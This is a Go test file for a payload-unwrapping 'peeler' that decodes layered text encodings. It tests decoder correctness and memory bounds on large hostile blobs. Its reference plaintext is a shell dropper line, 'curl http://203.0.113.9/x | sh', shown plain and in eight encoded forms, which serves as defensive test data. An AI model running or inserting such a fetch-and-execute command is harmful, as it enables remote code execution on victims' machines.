package peeler

import (
	"bytes"
	"context"
	"encoding/ascii85"
	"encoding/base32"
	"encoding/base64"
	"encoding/hex"
	"math/rand"
	"runtime"
	"strings"
	"testing"
)

// memboundLayer resolves one of the built-in layers, so a rename in the
// registry breaks this file where it belongs rather than somewhere else.
func memboundLayer(t *testing.T, name string) Unwrapper {
	t.Helper()
	for _, u := range DefaultUnwrappers() {
		if u.Name() == name {
			return u
		}
	}
	t.Fatalf("no layer named %s", name)
	return nil
}

// ── reference vectors ───────────────────────────────────────────────────────
//
// Every vector below was produced by an encoder that is not this one: Python's
// base64, binascii and ascii85 modules, and the published basE91 and base92 bit
// streams (13 or 14 bits a pair for base91, 13 bits a pair and a 6-bit tail for
// base92, both with the digit order those formats actually use). A decoder that
// changes what it returns, or what it returns it for, fails here as a changed
// output rather than as a self-consistent round trip.

// memboundMsg is the plaintext of the small vectors. It is the dropper shape
// the peeler is about, and it is long enough to clear every layer's minimum.
const memboundMsg = "#!/bin/sh\ncurl http://203.0.113.9/x | sh\n"

func TestMemboundReferenceVectors(t *testing.T) {
	for _, v := range []struct{ layer, what, encoded string }{
		{"base64", "wrapped at 76 columns, as base64(1) writes it", "IyEvYmluL3NoCmN1cmwgaHR0cDovLzIwMy4wLjExMy45L3ggfCBzaAo=\n"},
		{"base32", "RFC 4648, padded", "EMQS6YTJNYXXG2AKMN2XE3BANB2HI4B2F4XTEMBTFYYC4MJRGMXDSL3YEB6CA43IBI======"},
		{"base45", "RFC 9285", "%J4P:5ZED.:5*6D PC.KEG44MWEK8EJ/5NF67L6446%967L6EA7H8F6VFOQEA0"},
		{"ascii85", "Adobe form, bare", `,9\^LBl5SFBF86lEblk3FEDI_0/#(71G1@60ekI:3A5V"Hm!KD$3`},
		{"ascii85", "Adobe form, <~ ~> framed", `<~,9\^LBl5SFBF86lEblk3FEDI_0/#(71G1@60ekI:3A5V"Hm!KD$3~>`},
		{"base91", "basE91", "SDOxK::{WU6O48WoRBOJ][&6c11+?jWQ^n;aAk7zbI9tpFsoZdA"},
		{"base92", "base92", ".B/@RFcDywl1Wg^@H$&Wlj5e[=C3S8Wz2xh_h4W.U_wN,v#:FW2"},
		{"hex", "lowercase, unwrapped", "23212f62696e2f73680a6375726c20687474703a2f2f3230332e302e3131332e392f78207c2073680a"},
	} {
		got, err := memboundLayer(t, v.layer).Unwrap([]byte(v.encoded), 1<<20)
		if err != nil {
			t.Errorf("%s (%s): %v", v.layer, v.what, err)
			continue
		}
		if string(got) != memboundMsg {
			t.Errorf("%s (%s) = %q, want %q", v.layer, v.what, got, memboundMsg)
		}
	}
}

// TestMemboundAscii85ZeroRun is the one input where a single digit decodes to
// four bytes: a run of zero bytes encodes as 'z', so a body of nothing but 'z'
// is the shape that forced ascii85's old four-times-the-length buffer, and the
// shape that still needs it.
func TestMemboundAscii85ZeroRuns(t *testing.T) {
	const zeros = 4096
	raw := make([]byte, zeros) // all zero: every group of four encodes as 'z'
	enc := make([]byte, ascii85.MaxEncodedLen(zeros))
	n := ascii85.Encode(enc, raw)
	body := enc[:n]
	if bytes.IndexByte(body, 'z') < 0 {
		t.Fatalf("encoder produced no 'z': %q", body)
	}
	got, ok := ascii85Layer().decode(body)
	if !ok || !bytes.Equal(got, raw) {
		t.Fatalf("ascii85 of %d zero bytes: %d bytes back, ok=%v", zeros, len(got), ok)
	}
	// A body with ordinary digits and zero runs in it still has to decode
	// whole, and the short buffer (4/5 plus the partial group) has to be
	// enough for it, 'z' or no 'z'.
	plain := []byte{0x00, 0x11, 0x22, 0x33, 0x00, 0x00, 0x00, 0x00, 0x44, 0x55, 0x66, 0x77,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x88, 0x99, 0xaa, 0xbb}
	mixed := make([]byte, ascii85.MaxEncodedLen(len(plain)))
	m := ascii85.Encode(mixed, plain)
	if bytes.IndexByte(mixed[:m], 'z') < 0 {
		t.Fatalf("encoder produced no 'z' for a body with zero runs: %q", mixed[:m])
	}
	mixedOut, ok := ascii85Layer().decode(mixed[:m])
	if !ok || !bytes.Equal(mixedOut, plain) {
		t.Fatalf("ascii85 with zero runs: %x, ok=%v, want %x", mixedOut, ok, plain)
	}
	if room := len(mixed)/5*4 + 4; len(mixedOut) > room {
		t.Fatalf("mixed body of %d digits decoded to %d bytes, more than the %d the short buffer holds", m, len(got), room)
	}
}

// TestMemboundWorstCaseRatios pins the true worst case of the two decoders whose
// buffer was a full copy of their input. base91's pair carries 13 or 14 bits, so
// a body of the lowest digit — every pair a 14-bit group — is the shape that
// produces the most bytes per digit: seven eighths. base92's pair carries 13
// bits, so the same body yields thirteen sixteenths. Both are the bound the
// decoders now preallocate to, and both are below the one-byte-per-digit copy
// they replaced.
func TestMemboundWorstCaseRatios(t *testing.T) {
	const digits = 64 << 10
	for _, c := range []struct {
		name  string
		fn    func([]byte) ([]byte, bool)
		ratio int64 // bytes out, per 16 bytes in
		bound int64
	}{
		{"base91", decodeBase91, 14, digits*7/8 + 2},
		{"base92", decodeBase92, 13, digits*13/16 + 2},
	} {
		in := bytes.Repeat([]byte("A"), digits) // digit 0: the 14-bit and 13-bit groups
		out, ok := c.fn(in)
		if !ok {
			t.Fatalf("%s: not decodable", c.name)
		}
		want := digits * c.ratio / 16
		if int64(len(out)) != want {
			t.Errorf("%s: %d digits decoded to %d bytes, want %d", c.name, digits, len(out), want)
		}
		if int64(len(out)) > c.bound {
			t.Errorf("%s: %d bytes out over the %d the buffer reserves: it grew", c.name, len(out), c.bound)
		}
		// And over mixed input the byte count can only be lower.
		r := rand.New(rand.NewSource(11))
		for range 256 {
			mixed := make([]byte, digits)
			for i := range mixed {
				mixed[i] = byte(r.Intn(128)) // half the alphabet, randomly interleaved
			}
			if out, ok := c.fn(mixed); ok && int64(len(out)) > c.bound {
				t.Fatalf("%s: %d bytes out over the %d reserved", c.name, len(out), c.bound)
			}
		}
	}
}

// ── allocation bounds ───────────────────────────────────────────────────────

// memboundRaw is the plaintext every allocation leg below decodes: 12 MiB of
// deterministic pseudo-random bytes, so the same bytes are measured on every
// run and on every machine, with no zero byte in them (a run of four is what
// ascii85 writes as 'z', which needs the wide buffer).
func memboundRaw() []byte {
	raw := make([]byte, 12<<20)
	r := rand.New(rand.NewSource(20261106))
	for i := range raw {
		raw[i] = byte(1 + r.Intn(255))
	}
	return raw
}

// memboundWrapped is raw as base64(1) writes it: standard alphabet, 76 columns,
// one trailing newline. The stdlib's encoder writes no line breaks of its own,
// so the wrapping is done here.
func memboundWrapped(t *testing.T, raw []byte) []byte {
	t.Helper()
	one := base64.StdEncoding.EncodeToString(raw)
	var b strings.Builder
	b.Grow(len(one) + len(one)/76 + 1)
	for len(one) > 76 {
		b.WriteString(one[:76])
		b.WriteByte('\n')
		one = one[76:]
	}
	b.WriteString(one)
	b.WriteByte('\n')
	return []byte(b.String())
}

// TestTextDecoderAllocationsMatchTheirRatio bounds what one decoder allocates
// for one large blob, as a multiple of the blob it is handed. Each bound was
// measured on this tree and then set above it; the measurement before the
// buffers were right-sized is in the comment, and every one of these legs fails
// against it, so a decoder that goes back to a full or oversized copy is caught
// here.
func TestTextDecoderAllocationsMatchTheirRatio(t *testing.T) {
	raw := memboundRaw()
	flat := base64.StdEncoding.EncodeToString(raw)
	b32 := base32.StdEncoding.EncodeToString(raw)
	hexed := make([]byte, 2*len(raw))
	hex.Encode(hexed, raw)
	a85 := make([]byte, ascii85.MaxEncodedLen(len(raw)))
	n := ascii85.Encode(a85, raw)

	// Every blob is built before the counter is read: a []byte(string) made
	// inside the window would count as the decoder's own allocation.
	for _, c := range []struct {
		layer string
		blob  []byte
		ratio float64 // of the blob's length
		was   float64 // measured before the right-sizing
	}{
		{"base64", memboundWrapped(t, raw), 2.2, 2.715},
		{"base64", []byte(flat), 1.0, 1.750},
		{"base32", []byte(b32), 1.4, 2.000},
		{"hex", hexed, 1.0, 1.500},
		{"ascii85", a85[:n], 1.6, 4.001},
	} {
		u := memboundLayer(t, c.layer)
		var before, after runtime.MemStats
		runtime.ReadMemStats(&before)
		out, err := u.Unwrap(c.blob, int64(len(c.blob)))
		runtime.ReadMemStats(&after)
		used := float64(after.TotalAlloc-before.TotalAlloc) / float64(len(c.blob))
		if used > c.ratio {
			t.Errorf("%s over %d MiB: allocated %.3f of the input (bound %.2f, was %.3f)",
				c.layer, len(c.blob)>>20, used, c.ratio, c.was)
		}
		t.Logf("%-8s over %2d MiB: %.3f of the input (bound %.2f, was %.3f) -> %d MiB out, %v",
			c.layer, len(c.blob)>>20, used, c.ratio, c.was, len(out)>>20, err)
	}
}

// TestHostileTextPeelAllocationStaysBounded peels two large hostile text blobs
// end to end and bounds what the whole peel allocates. The lineage is the
// paragraph in docs/cli.md: 60 MiB of base64 peaked at about 840 MB of heap,
// because a text decoder copied or over-allocated its way through the limit
// check while eight of them ran over the same blob. Both bounds below were
// measured on this tree at a 16 MiB scale and then set above the measurement.
//
// The ascii85 leg is the one with teeth: a 15 MiB Adobe body allocated 61.7 MiB
// before — four times its length, for 12 MiB of output — and 13.0 MiB now. The
// base64 leg is a regression guard rather than a proof: the joined-line copy
// textBody makes for each of the twenty-odd layers still dominates a peel of
// wrapped base64, and that is not a decoder's output buffer, so it stays.
func TestHostileTextPeelAllocationStaysBounded(t *testing.T) {
	raw := memboundRaw()
	for _, c := range []struct {
		name       string
		blob       []byte
		bound      int64
		was        int64
		zeroIsWide bool // ascii85: a 'z' in the body needs the wide buffer
	}{
		{"16 MiB of wrapped base64", memboundWrapped(t, raw), 528 << 20, 501 << 20, false},
		{"15 MiB of ascii85", a85Blob(t, raw), 24 << 20, 62 << 20, true},
	} {
		// A body carrying a 'z' can still need four times its length, so the
		// ascii85 bound widens to cover it rather than failing on it.
		if c.zeroIsWide && bytes.IndexByte(c.blob, 'z') >= 0 {
			c.bound = int64(len(c.blob)) * 4
			t.Logf("%s carries a 'z': the wide bound applies", c.name)
		}
		var before, after runtime.MemStats
		runtime.ReadMemStats(&before)
		r := New().Peel(context.Background(), c.blob)
		runtime.ReadMemStats(&after)
		used := after.TotalAlloc - before.TotalAlloc
		if int64(used) > c.bound {
			t.Errorf("%s: peel of %d MiB allocated %d MiB (bound %d MiB, was %d MiB)",
				c.name, len(c.blob)>>20, used>>20, c.bound>>20, c.was>>20)
		}
		t.Logf("%s: peel of %d MiB allocated %.1f MiB (bound %d MiB, was %d MiB) -> %s at depth %d",
			c.name, len(c.blob)>>20, float64(used)/(1<<20), c.bound>>20, c.was>>20, r.Outcome, r.MaxDepth)
	}
}

func a85Blob(t *testing.T, raw []byte) []byte {
	t.Helper()
	out := make([]byte, ascii85.MaxEncodedLen(len(raw)))
	n := ascii85.Encode(out, raw)
	return out[:n]
}
